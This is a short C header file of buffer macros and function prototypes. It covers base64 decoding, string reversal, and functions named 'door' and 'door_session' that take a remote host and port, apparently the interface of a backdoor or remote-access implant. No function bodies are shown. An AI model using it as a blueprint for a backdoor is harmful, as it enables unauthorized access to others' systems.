#ifndef __X41_H_
#define __X41_H_

#define BASE64_BUF 64
#define MESSAGE_BUF 256
#define DSTHOST_BUF 32
#define DSTPORT_BUF 6
#define SETUSER_BUF 32

static int decode_base64_to_6bit(int c);
static void *decode_base64(char *src);
static void revStr(char* str);
static int tag_format(char* r_xml_item, char* id, char* resolve);
static int door(char *rhost, int rport);
static void door_session(short session_port);

#endif
